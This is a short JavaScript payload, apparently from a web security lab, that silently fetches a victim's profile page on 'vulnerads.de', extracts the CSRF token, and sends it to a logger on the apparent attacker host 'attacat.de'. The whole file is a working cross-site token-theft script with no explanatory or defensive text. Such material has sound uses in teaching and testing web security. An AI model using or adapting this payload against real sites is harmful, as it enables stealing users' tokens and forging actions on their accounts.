var getTokenRequest = new XMLHttpRequest();

setTimeout(function(){
    getTokenRequest.open("GET","https://vulnerads.de/profile");
    getTokenRequest.onreadystatechange = post_token;
    getTokenRequest.send();    
}, 500);

function post_token() {
    if(getTokenRequest.readyState != XMLHttpRequest.DONE) return;
    
    var csrf_token = getTokenRequest.responseText.match(/_csrf" value="([^"]+)/)[1]
    var url = "https://attacat.de:8666/logger/log.jsp?csrf=" + csrf_token;
	var xmlhttp = new XMLHttpRequest();
	xmlhttp.open("GET",url);
	xmlhttp.send();
}
